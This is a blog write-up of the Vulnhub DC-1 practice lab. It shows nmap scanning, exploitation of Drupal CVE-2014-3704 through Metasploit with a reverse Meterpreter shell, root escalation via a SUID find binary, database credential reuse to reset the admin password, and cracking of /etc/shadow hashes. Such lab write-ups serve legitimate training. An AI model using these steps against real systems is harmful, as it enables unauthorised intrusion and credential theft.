---
title: "DC-1 - Vulnhub"
date: 2019-04-10 12:52:16 +0000
comments: true
classes: wide
header:
  teaser: 
  teaser_home_page: true
categories:
  - infosec
  - writeup
  - challenges
tags:  
  - database
  - ctf
  - webshells
  - drupal
  - easy
  - vulnhub
---

 
**Name:** DC-1

**Author:** DCAU

**Vulnhub URL:** [https://www.vulnhub.com/entry/dc-1-1,292/](https://www.vulnhub.com/entry/dc-1-1,292/)

**Description:**

DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.

It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.

To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.

There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.

There are five flags in total, but the ultimate goal is to find and read the flag in root's home directory. You don't even need to be root to do this, however, you will require root privileges.

Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.

Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.

<!-- more -->

## Discovery

`netdiscover`

{% highlight bash %}
 Currently scanning: 192.168.76.0/16   |   Screen View: Unique Hosts
 
 22 Captured ARP Req/Rep packets, from 19 hosts.   Total size: 1320                                               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.119   00:0c:29:f7:a8:d1      1      60  VMware, Inc.

{% endhighlight %}


## Scanning

### TCP

`nmap -PN -vv -sSV -sC -A --script=default,version,banner,vuln --script-args=unsafe=1 -p0- -T4 -iL targets.txt -oA nmap_tcp_fullconn_targets.txt`


### UDP

`nmap -PN -vv -sU -n -T4 -iL targets.txt -oA nmap_udp_def_targets.txt`

### Summary

{% highlight bash %}
+=========================================================================================+
| HOST             | PORT / PROTOCOL  | SERVICE                                           |
+=========================================================================================+
| 192.168.0.119    | 22 / tcp         | ssh - OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.  |
| 192.168.0.119    | 80 / tcp         | http - Apache httpd 2.2.22 ((Debian))             |
| 192.168.0.119    | 111 / tcp        | rpcbind - 2-4 (RPC #100000)                       |
| 192.168.0.119    | 111 / udp        | rpcbind                                           |
| 192.168.0.119    | 37936 / tcp      | status - 1 (RPC #100024)                          |
+=========================================================================================+
{% endhighlight %}

## Service Enumeration

Nothing intreasting from SSH,RPC.. seems like we have to get in from the webapp

### 80 - http

http://192.168.0.119

![alt text]({{ site.baseurl }}/assets/images/dc1/1.png)

Drupal Verion 7

`nikto -h 192.168.0.119`

`dirb http://192.168.0.119`


 
## Exploitation


Looking over the nmap scan we see that the Drupal version is vulnerable to the following exploit

{% highlight bash %}
|   VULNERABLE:
|   Drupal - pre Auth SQL Injection Vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-3704
|         The expandArguments function in the database abstraction API in
|         Drupal core 7.x before 7.32 does not properly construct prepared
|         statements, which allows remote attackers to conduct SQL injection
|         attacks via an array containing crafted keys.
|           
|     Disclosure date: 2014-10-15
|     References:
|       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
|       http://www.securityfocus.com/bid/70595
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704
|_      https://www.drupal.org/SA-CORE-2014-005
{% endhighlight %}


Metasploit was fired up and to use drupageddon exploit

{% highlight bash %}
multi/http/drupal_drupageddon

[*] Started reverse TCP handler on 192.168.0.83:4444 
[*] Sending stage (38247 bytes) to 192.168.0.119
[*] Meterpreter session 1 opened (192.168.0.83:4444 -> 192.168.0.119:59857) at 2019-05-09 13:04:08 +0100

meterpreter > getuid
Server username: www-data (33)
{% endhighlight %}

We get a meterpreter shell as the **www-data** user 

## Priv-Esc

I dropped into a normal shell and noticed it was running python so used this to get a tty 

`python -c 'import pty; pty.spawn("/bin/bash")'`

using scp I copied up LinEnum - [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

{% highlight bash %}
scp root@192.168.0.83:/usr/share/LinEnum/LinEnum.sh .

chmod +x LinEnum.sh
./LinEnum.sh -t | tee LinEnum-output.txt
{% endhighlight %}

going thorugh the LinEnum output i noticed that that find has the SUID set

{% highlight bash %}
-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
{% endhighlight %}

This was abused to get higher privs

{% highlight bash %}
www-data@DC-1:/tmp$ touch test
www-data@DC-1:/tmp$ find test -exec "whoami" \;   
root

www-data@DC-1:/tmp$ find test -exec "/bin/sh" \;
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
# 
{% endhighlight %}

now we have a shell with root perms :)

### flag 1

This was found as soon as i got a shell on the box sitting in the www folder

{% highlight bash %}
# cat /var/www/flag1.txt
cat /var/www/flag1.txt
Every good CMS needs a config file - and so do you.
{% endhighlight %}


### flag 2

Inside the drupal **settings.php** we find flag2 and a hint

{% highlight bash %}
cat /var/www/sites/default/settings.php
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
.........
{% endhighlight %}

### flag 3

Using the mysql credentials found in **settings.php** I sucessfully connected and could access the **drupaldb** database and went straight for the users table but it was not possible to crack the hashes 


{% highlight bash %}

www-data@DC-1:/tmp$ mysql -u dbuser -p
mysql -u dbuser -p
Enter password: R0ck3t

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 19893
Server version: 5.5.60-0+deb7u1 (Debian)


mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| drupaldb           |
+--------------------+
2 rows in set (0.01 sec)

mysql> use drupaldb
use drupaldb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

select uid,name,pass from users;
+-----+-------+---------------------------------------------------------+
| uid | name  | pass                                                    |
+-----+-------+---------------------------------------------------------+
|   0 |       |                                                         |
|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |
|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
|   3 | test  | $S$DfRd9Oy3cmNH19AaTvrsJmMmqDJ4RnEhekTRuXShDQmwjauuIGkf |
+-----+-------+---------------------------------------------------------+
4 rows in set (0.00 sec)
{% endhighlight %}

After Doing some Googling I found out how to change the admin password in the database 

[https://knackforge.com/blog/sivaji/different-ways-reset-drupal-admin-password](https://knackforge.com/blog/sivaji/different-ways-reset-drupal-admin-password)

within mysql i updated the password has for admin so the password is now **druapl**

{% highlight bash %}
mysql> UPDATE users SET name='admin', pass='$S$Drl0vgZ9yuU9uc4JyaTMHxMPriC7q/PsOUOx52fCrVQSTpI/Tu4x' WHERE uid = 1;
<Z9yuU9uc4JyaTMHxMPriC7q/PsOUOx52fCrVQSTpI/Tu4x' WHERE uid = 1;              
Query OK, 1 row affected (0.02 sec)
Rows matched: 1  Changed: 1  Warnings: 0
{% endhighlight %}

Boom I can now login as admin

Looking around the dashboard flag 3 was found

![alt text]({{ site.baseurl }}/assets/images/dc1/3.png)



### flag 4

{% highlight bash %}
pwd
/home/flag4

cat flag4.txt
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
{% endhighlight %}

There is a **flag4** user in /etc/passwd

after getting root I pulled down /etc/passwd and /etc/shadow

Unshadowed the file 

`unshadow passwd shadow > unshadow.txt`

Used **hashcat-gui** for a change to try and crack it - [https://hashkiller.co.uk/Tools/HashcatGUI](https://hashkiller.co.uk/Tools/HashcatGUI)

![alt text]({{ site.baseurl }}/assets/images/dc1/2.png)

user:	flag4
pass:	orange
$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:orange

Now I can login to the box over ssh as the **fag 4** user 

{% highlight bash %}
ssh flag4@192.168.0.119 
flag4@192.168.0.119's password: 
Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
flag4@DC-1:~$ uname -a
Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux
flag4@DC-1:~$ 
{% endhighlight %}


### thefinalflag.txt

The final flag was found sitting in the root folder

{% highlight bash %}
cd /root
# ls
thefinalflag.txt
# pwd 
/root
# cat thefinalflag.txt
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
# 
{% endhighlight %}




